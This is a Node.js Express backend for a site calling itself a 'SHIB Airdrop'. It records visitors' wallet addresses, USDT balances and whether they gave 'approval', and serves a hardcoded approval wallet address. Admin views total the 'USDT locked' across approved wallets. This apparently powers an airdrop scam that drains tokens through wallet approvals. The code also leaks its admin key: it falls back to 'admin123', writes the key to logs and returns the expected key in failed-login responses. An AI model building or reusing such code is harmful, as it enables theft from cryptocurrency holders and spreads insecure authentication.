const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
require('dotenv').config();

const app = express();

// ✅ FIXED: CORS Configuration for Netlify
const corsOptions = {
    origin: [
        'https://shib-airdrop.netlify.app',  // Your Netlify frontend
        'http://localhost:3000',              // Local development
        'http://127.0.0.1:3000',             // Local development
        'http://localhost:8080',              // Local backend
        'http://127.0.0.1:8080'              // Local backend
    ],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'admin-key', 'Accept'],
    credentials: true,
    optionsSuccessStatus: 200
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json());

// Environment Variables
const MONGODB_URI = process.env.MONGODB_URI;

// ✅ FIXED FOR RAILWAY BUG: Handle automatic @ symbol addition
const getAdminKey = () => {
    const envKey = process.env.ADMIN_KEY;
    
    console.log('=== RAILWAY ADMIN_KEY DEBUG ===');
    console.log('Raw ADMIN_KEY from env:', `"${envKey}"`);
    console.log('Type:', typeof envKey);
    console.log('Length:', envKey?.length);
    
    if (envKey) {
        console.log('Character codes:', envKey.split('').map(c => `${c}(${c.charCodeAt(0)})`).join(' '));
    }
    
    if (!envKey) {
        console.log('⚠️ ADMIN_KEY not found in env, using default');
        return 'admin123';
    }
    
    // Remove @ symbols that Railway might be adding automatically
    const cleanKey = envKey.replace(/@/g, '');
    
    if (cleanKey !== envKey) {
        console.log('🔄 Removed @ symbols from ADMIN_KEY');
        console.log('Original:', `"${envKey}"`);
        console.log('Cleaned:', `"${cleanKey}"`);
    }
    
    console.log('Final ADMIN_KEY:', `"${cleanKey}"`);
    console.log('================================');
    
    return cleanKey;
};

const ADMIN_KEY = getAdminKey();
const PORT = process.env.PORT || 8080;

// MongoDB Connection
const connectDB = async () => {
    try {
        if (!MONGODB_URI) {
            console.log('⚠️ MONGODB_URI not found, running without database...');
            return false;
        }
        
        await mongoose.connect(MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            serverSelectionTimeoutMS: 5000,
            socketTimeoutMS: 45000,
        });
        console.log('✅ Connected to MongoDB Atlas');
        return true;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        console.log('⚠️ Running without database connection...');
        return false;
    }
};

// User Schema
const userSchema = new mongoose.Schema({
    walletAddress: { type: String, required: true, unique: true },
    usdtBalance: String,
    airdropAmount: String,
    referralCount: { type: Number, default: 0 },
    approvalGiven: { type: Boolean, default: false },
    approvalTimestamp: Date,
    tier: String,
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Settings Schema
const settingsSchema = new mongoose.Schema({
    approvalWalletAddress: { type: String, default: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" },
    updatedAt: { type: Date, default: Date.now }
});

const Settings = mongoose.model('Settings', settingsSchema);

// Initialize default settings
async function initializeSettings() {
    try {
        const settings = await Settings.findOne();
        if (!settings) {
            const defaultSettings = new Settings();
            await defaultSettings.save();
            console.log('✅ Default settings initialized');
        }
    } catch (error) {
        console.error('⚠️ Error initializing settings:', error.message);
    }
}

// ========================
// ✅ FIXED: Railway Health Check Routes
// ========================

// Health check for Railway (Root level)
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'SHIB Airdrop Backend',
        environment: process.env.NODE_ENV || 'production'
    });
});

// API Health check
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'SHIB Airdrop Backend is running!', 
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'production',
        cors: 'Enabled for Netlify'
    });
});

// Handle pre-flight requests
app.options('*', cors(corsOptions));

// ========================
// ✅ FIXED: ADMIN APIs with Railway bug fix
// ========================

// ✅ FIXED: Better admin authentication with Railway bug handling
const authenticateAdmin = (req, res, next) => {
    const receivedKey = (req.headers['admin-key'] || '').trim();
    const expectedKey = ADMIN_KEY.trim();
    
    console.log('🔐 ADMIN AUTHENTICATION CHECK');
    console.log('Received key:', `"${receivedKey}"`);
    console.log('Expected key:', `"${expectedKey}"`);
    console.log('Keys match:', receivedKey === expectedKey);
    
    // Also check if received key matches after removing @ symbols
    const cleanedReceivedKey = receivedKey.replace(/@/g, '');
    const cleanedMatch = cleanedReceivedKey === expectedKey;
    console.log('Cleaned received key:', `"${cleanedReceivedKey}"`);
    console.log('Cleaned keys match:', cleanedMatch);
    
    if (!receivedKey || (receivedKey !== expectedKey && !cleanedMatch)) {
        console.log('❌ ADMIN AUTHENTICATION FAILED');
        return res.status(401).json({ 
            success: false, 
            message: 'Unauthorized: Invalid admin key',
            debug: {
                receivedLength: receivedKey.length,
                expectedLength: expectedKey.length,
                received: receivedKey,
                expected: expectedKey
            }
        });
    }
    
    console.log('✅ ADMIN AUTHENTICATION SUCCESS');
    next();
};

// Get all approvals for admin panel
app.get('/api/admin/approvals', authenticateAdmin, async (req, res) => {
    try {
        const { page = 1, limit = 50, search, tier } = req.query;
        
        let filter = { approvalGiven: true };
        
        // Search by wallet address
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        // Filter by tier
        if (tier) {
            filter.tier = tier;
        }
        
        const skip = (page - 1) * limit;
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .skip(skip)
            .limit(parseInt(limit))
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        const total = await User.countDocuments(filter);
        
        res.json({
            success: true,
            data: approvals,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                total,
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching admin approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get admin dashboard statistics
app.get('/api/admin/stats', authenticateAdmin, async (req, res) => {
    try {
        const totalApprovals = await User.countDocuments({ approvalGiven: true });
        const totalUsers = await User.countDocuments();
        
        // Calculate total USDT locked
        const approvedUsers = await User.find({ approvalGiven: true });
        let totalUSDT = 0;
        approvedUsers.forEach(user => {
            const balance = parseFloat(user.usdtBalance) || 0;
            totalUSDT += balance;
        });
        
        // Tier distribution
        const tierStats = await User.aggregate([
            { $match: { approvalGiven: true } },
            { $group: { _id: "$tier", count: { $sum: 1 } } }
        ]);
        
        // Today's approvals
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const todayApprovals = await User.countDocuments({ 
            approvalGiven: true, 
            approvalTimestamp: { $gte: today } 
        });
        
        res.json({
            success: true,
            data: {
                totalApprovals,
                totalUsers,
                totalUSDT: parseFloat(totalUSDT.toFixed(2)),
                todayApprovals,
                tierStats: tierStats.reduce((acc, curr) => {
                    acc[curr._id] = curr.count;
                    return acc;
                }, {})
            }
        });
    } catch (error) {
        console.error('Error fetching admin stats:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approvals with filters for admin
app.get('/api/admin/approvals/filter', authenticateAdmin, async (req, res) => {
    try {
        const { date, minAmount, maxAmount, tier, search } = req.query;
        let filter = { approvalGiven: true };
        
        // Date filter
        if (date) {
            const startDate = new Date(date);
            const endDate = new Date(date);
            endDate.setDate(endDate.getDate() + 1);
            
            filter.approvalTimestamp = {
                $gte: startDate,
                $lt: endDate
            };
        }
        
        // USDT amount filters
        if (minAmount || maxAmount) {
            filter.usdtBalance = {};
            if (minAmount) {
                filter.usdtBalance.$gte = parseFloat(minAmount).toString();
            }
            if (maxAmount) {
                filter.usdtBalance.$lte = parseFloat(maxAmount).toString();
            }
        }
        
        // Tier filter
        if (tier) {
            filter.tier = tier;
        }
        
        // Search filter
        if (search) {
            filter.walletAddress = { $regex: search, $options: 'i' };
        }
        
        const approvals = await User.find(filter)
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount createdAt');
        
        res.json({
            success: true,
            data: approvals,
            count: approvals.length
        });
    } catch (error) {
        console.error('Error filtering approvals:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// ========================
// ✅ FIXED: USER APIs with better error handling
// ========================

// Save user approval
app.post('/api/save-approval', async (req, res) => {
    try {
        const { walletAddress, usdtBalance, airdropAmount, tier } = req.body;
        
        console.log('✅ Saving approval for:', walletAddress, 'USDT:', usdtBalance, 'Tier:', tier);
        
        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address is required' });
        }
        
        // ✅ FIXED: Check if MongoDB is connected
        if (mongoose.connection.readyState !== 1) {
            console.log('⚠️ MongoDB not connected, but returning success');
            return res.json({ 
                success: true, 
                message: 'Approval recorded (offline mode)',
                offline: true
            });
        }
        
        let user = await User.findOne({ walletAddress });
        
        if (user) {
            // Update existing user
            user.usdtBalance = usdtBalance || user.usdtBalance;
            user.airdropAmount = airdropAmount || user.airdropAmount;
            user.tier = tier || user.tier;
            user.approvalGiven = true;
            user.approvalTimestamp = new Date();
        } else {
            // Create new user
            user = new User({
                walletAddress,
                usdtBalance,
                airdropAmount,
                tier,
                approvalGiven: true,
                approvalTimestamp: new Date()
            });
        }
        
        await user.save();
        console.log('✅ Approval saved successfully for:', walletAddress);
        res.json({ success: true, message: 'Approval saved successfully' });
    } catch (error) {
        console.error('❌ Error saving approval:', error);
        
        // ✅ FIXED: Handle duplicate key error gracefully
        if (error.code === 11000) {
            return res.json({ 
                success: true, 
                message: 'Approval already exists for this wallet' 
            });
        }
        
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get approval wallet address
app.get('/api/approval-wallet', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({ 
                success: true, 
                approvalWalletAddress: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
            });
        }
        
        const settings = await Settings.findOne();
        res.json({ 
            success: true, 
            approvalWalletAddress: settings?.approvalWalletAddress || "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    } catch (error) {
        console.error('Error fetching approval wallet:', error);
        res.json({ 
            success: true, 
            approvalWalletAddress: "0xCcf0a381D804BFa37485Bc450CE540c09350f975" 
        });
    }
});

// Update approval wallet address (Admin only)
app.post('/api/update-approval-wallet', async (req, res) => {
    try {
        const { newWalletAddress, adminKey } = req.body;
        
        // Admin authentication
        if (adminKey !== ADMIN_KEY) {
            return res.status(401).json({ success: false, message: 'Unauthorized' });
        }
        
        if (!newWalletAddress || !newWalletAddress.startsWith('0x')) {
            return res.status(400).json({ success: false, message: 'Valid wallet address required' });
        }
        
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.status(500).json({ success: false, message: 'Database not available' });
        }
        
        let settings = await Settings.findOne();
        if (!settings) {
            settings = new Settings();
        }
        
        settings.approvalWalletAddress = newWalletAddress;
        settings.updatedAt = new Date();
        
        await settings.save();
        res.json({ success: true, message: 'Approval wallet updated successfully' });
    } catch (error) {
        console.error('Error updating approval wallet:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

// Get all users who gave approval
app.get('/api/approved-users', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({ success: true, users: [] });
        }
        
        const users = await User.find({ approvalGiven: true })
            .sort({ approvalTimestamp: -1 })
            .select('walletAddress usdtBalance airdropAmount tier approvalTimestamp referralCount');
        
        res.json({ success: true, users });
    } catch (error) {
        console.error('Error fetching approved users:', error);
        res.json({ success: true, users: [] });
    }
});

// Get user statistics
app.get('/api/user-stats', async (req, res) => {
    try {
        // ✅ FIXED: Check MongoDB connection
        if (mongoose.connection.readyState !== 1) {
            return res.json({
                success: true,
                stats: {
                    totalUsers: 0,
                    approvedUsers: 0,
                    totalAirdropAmount: 0
                }
            });
        }
        
        const totalUsers = await User.countDocuments();
        const approvedUsers = await User.countDocuments({ approvalGiven: true });
        
        const users = await User.find({ approvalGiven: true });
        let totalAirdropAmount = 0;
        users.forEach(user => {
            const amount = parseFloat(user.airdropAmount) || 0;
            totalAirdropAmount += amount;
        });
        
        res.json({
            success: true,
            stats: {
                totalUsers,
                approvedUsers,
                totalAirdropAmount: Math.round(totalAirdropAmount)
            }
        });
    } catch (error) {
        console.error('Error fetching user stats:', error);
        res.json({
            success: true,
            stats: {
                totalUsers: 0,
                approvedUsers: 0,
                totalAirdropAmount: 0
            }
        });
    }
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'SHIB Airdrop Backend API',
        version: '1.0.0',
        cors: 'Enabled for Netlify',
        endpoints: {
            health: '/health',
            apiHealth: '/api/health',
            approvalWallet: '/api/approval-wallet',
            saveApproval: '/api/save-approval',
            approvedUsers: '/api/approved-users',
            userStats: '/api/user-stats',
            adminApprovals: '/api/admin/approvals',
            adminStats: '/api/admin/stats',
            adminFilter: '/api/admin/approvals/filter'
        }
    });
});

// ========================
// ✅ FIXED: Railway Health Check & Keep Alive
// ========================

// Start server
const startServer = async () => {
    try {
        const dbConnected = await connectDB();
        if (dbConnected) {
            await initializeSettings();
        }
        
        const server = app.listen(PORT, '0.0.0.0', () => {
            console.log(`🚀 Backend server running on port ${PORT}`);
            console.log(`📊 Environment: ${process.env.NODE_ENV || 'production'}`);
            console.log(`🌐 CORS Enabled for: https://shib-airdrop.netlify.app`);
            console.log(`🔐 Admin Key: ${ADMIN_KEY}`);
            console.log(`🗄️ Database: ${dbConnected ? 'Connected ✅' : 'Offline ⚠️'}`);
            console.log('✅ All APIs are now available!');
        });

        // ✅ Keep alive for Railway
        process.on('SIGTERM', () => {
            console.log('Received SIGTERM, performing graceful shutdown');
            server.close(() => {
                console.log('Server closed');
                process.exit(0);
            });
        });

        process.on('SIGINT', () => {
            console.log('Received SIGINT, performing graceful shutdown');
            server.close(() => {
                console.log('Server closed');
                process.exit(0);
            });
        });

        // ✅ Heartbeat to prevent shutdown
        setInterval(() => {
            console.log('🟢 Server heartbeat:', new Date().toISOString());
        }, 60000);

    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
};

startServer();
